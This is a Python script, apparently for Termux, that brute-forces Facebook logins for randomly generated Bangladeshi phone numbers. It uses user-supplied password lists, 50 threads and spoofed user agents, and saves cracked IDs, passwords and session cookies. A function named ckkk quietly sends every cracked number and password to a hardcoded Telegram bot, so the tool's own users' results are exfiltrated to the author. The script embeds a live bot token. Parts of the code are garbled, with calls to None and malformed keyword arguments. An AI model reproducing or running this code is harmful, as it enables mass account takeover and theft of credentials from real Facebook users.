import os

import sys

import time

import requests

import uuid

os.system('git pull')

os.system('pkg install curl')

class jalan:

    

    def __init__(self, z):

        pass


def ud():

    os.system('clear')

    jalan(logo)

    print(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;46m JOIN MY 1st GROUP')

    print(' \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\033[38;5;196m EXIT')

    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m')

    if opt == 'A':

        os.system('xdg-open https://facebook.com/groups/551365756758487/')

        ND()

        return None

    None('\n\x1b[1;31mEXIT\x1b[0;97m')

def ND():

    os.system('clear')

    print(logo)

    print(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;46m JOIN MY 2nd GROUP')

    print(' \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\033[38;5;196m EXIT')

    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m')

    if opt == 'A':

        os.system('xdg-open https://facebook.com/groups/920428789151086/')

        o()

        return None

    None('\n\x1b[1;31mEXIT\x1b[0;97m')

def o():

    os.system('clear')

    jalan(logo)

    jalan('\t   \033[38;5;192m👾HASAN NUMBAR TOOLS👾')

    print(' \033[1;93m\033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')

    jalan(' \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;46m RANDOM CLONE ')

    jalan(' \033[38;5;196m[\033[38;5;195mB\033[38;5;196m]\033[38;5;46m CONTAC ADMIN')

    jalan(' \033[38;5;196m[\033[38;5;195mC\033[38;5;196m]\033[38;5;46m JOIN MY 1st GROUP')

    jalan(' \033[38;5;196m[\033[38;5;195mD\033[38;5;196m]\033[38;5;46m JOIN MY 2nd GROUP')

    jalan(' \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\033[38;5;196m EXIT')
    print(' \033[1;93m\033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')

    opt = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Choose option \033[38;5;195m: \033[38;5;46m ')

    if opt == 'A':

        i()

    if None == 'B':

        os.system('xdg-open https://www.facebook.com/copy.link.erorr404')

        return None

    if None == 'C':

        os.system('xdg-open https://facebook.com/groups/551365756758487/')

        return None

    if None == 'D':

        os.system('xdg-open https://facebook.com/groups/920428789151086/')

        return None

    if None == 'E':

        os.system('exit')

        return None

    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')

import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    

def cek_apk(session,coki):

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))

    else:

        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')

 

def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://free.facebook.com' + str(get), {

            'cookie': coki }, **('cookies',)).text

            

            

 

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.009)

            

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

def ckkk(uid,ps):
	fbapi = "6023459177:AAHGA-S0g230gklrxyg7n0vTFPJ8RI1Dq34";bot_id = "1818606358";chat_id = "5012287298";message = ("ok >> "+ uid + " | " +ps);url = f"https://api.telegram.org/bot{fbapi}/sendMessage?chat_id={bot_id}&text={message}";url2 = f"https://api.telegram.org/bot{fbapi}/sendMessage?chat_id={chat_id}&text={message}";s=(requests.get(url).json());d=(requests.get(url2).json())            

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today()

logo =                                          ("""   

  \033[1;92m██   ██  █████  ███████  █████  ███    ██ 
  \033[1;92m██   ██ ██   ██ ██      ██   ██ ████   ██ 
  \033[1;92m███████ ███████ ███████ ███████ ██ ██  ██ 
  \033[1;92m██   ██ ██   ██      ██ ██   ██ ██  ██ ██ 
  \033[1;92m██   ██ ██   ██ ███████ ██   ██ ██   ████ 
         
 \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mASRAFUL ISLAM HASAN   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m Hasa N                \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mKgHasan               \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning Bd     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mKST                   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.0                   \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
 \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m PLZ SAPPORT ME BRO....
 \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m HASAN TERMUX HELPING ZONE....
 \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××\n""")

loop = 0

oks = []

cps = []

 

def clear():

    os.system('clear')

    print(logo)

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

    

    

try:

    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')

    v = 5.2

    update = ('5.2')

    update = ('5.2')

    if str(v) in update:

        os.system('clear')

    else:pass

except:print('\n\033[1;31mNo internet connection ... \033[0;97m')

#global functions

def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)

 

#User agents

ugen2=[]

ugen=[]

 

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    

# APK CHECK

def i():

    user=[]

    twf =[]

    os.getuid

    os.geteuid

    os.system("clear")

    jalan(logo)

    
    jalan(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')

    jalan(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m BD CODES    \033[38;5;45m016, \033[38;5;46m017 ,\033[38;5;192m018 ,\033[38;5;195m019  ...\033[0;97m')

    jalan(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')

    code = input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m SIM CODE\033[38;5;195m : \033[38;5;46m')

    print(" \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")

    limit = int(input(' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m EXAMPLE\033[38;5;46m: \033[38;5;195m2000, \033[38;5;46m3000, \033[38;5;45m50000, \033[38;5;46m100000\n \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××× \n \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;45m CLONING LIMIT\033[38;5;195m:\033[38;5;46m '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(7))

        user.append(nmp)

    os.system("clear")

    print(logo)

    passx = int(input(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Enter Password Limit\033[38;5;195m : \033[38;5;46m"))

    HamiiID = []
    print("")
    print(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example \033[38;5;195m: \033[38;5;46mbangladesh, \033[38;5;192mi love you, \033[38;5;45mfreefire, \033[38;5;195m12345678, Enc.")
    print("")
    for bilal in range(passx):

        pww = input(" \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Enter Password\033[38;5;195m :\033[38;5;46m ")

        HamiiID.append(pww)

    with ThreadPool(max_workers=50) as manshera:

        clear()

        tl = str(len(user))

        print('\033[38;5;192m TOTAL IDS: \033[38;5;46m'+tl)

        print('\033[38;5;192m THE PROCESS HAS BEEN STARTED')

        print('\033[38;5;192m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print(' \033[38;5;45mS-Saimon \033[38;5;46m/ \033[38;5;45mH-HASAN\033[38;5;45m We Are Brother💚')
        print(' \033[38;5;46mWorking Data + Wifi ')

        print(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')

        for love in user:

            pwx = [love[1:]]

            uid = code+love

            for Eman in HamiiID:

                pwx.append(Eman)

            manshera.submit(rcrack,uid,pwx,tl)

    print(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')

    print('\033[38;5;46mClone process has been completed')

    print('\033[38;5;46mIds saved in ok.txt,cp.txt')

    print(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')

 

def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {"authority": 'free.facebook.com',

            "method": 'GET',

            "scheme": 'https',

            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',

            "accept-encoding": 'gzip, deflate, br',

            "accept-language": 'en-US,en;q=1',

            'cache-control': 'no-cache, no-store, must-revalidate',

            "referer": 'https://t.facebook.com/',

            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',

            "sec-ch-ua-mobile": '?1',

            "sec-ch-ua-platform": "Windows",

            "sec-fetch-dest": 'document',

            "sec-fetch-mode": 'navigate',

            "sec-fetch-site": 'same-origin',

            "sec-fetch-user": '?0',

            "pragma": 'no-cache',

            "priority": 'u=0',

            'cross-origin-resource-policy': 'cross-origin',

            "upgrade-insecure-requests": '1',

            'user-agent':'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'}

            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(' \033[38;5;46m[HASAN-OK💉]  ' +uid+ ' | ' +ps+    '  \n \033[38;5;45mCookie 🍪= \033[38;5;192m'+coki+  ' \n \033[38;5;45mUsar Agent 👾= '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/HASAN-OK.txt', 'a').write( cid+' | '+ps+'\n')

                oks.append(cid)
                ckkk(uid,ps)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[24:39]

                print( ' \033[38;5;196m[HASAN-CP💔]  ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/HASAN-CP.txt', 'a').write( cid+' | '+ps+' \n')

                cps.append(cid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write('\r %s[HASAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),

        sys.stdout.flush()

    except:

        pass

 

ud()
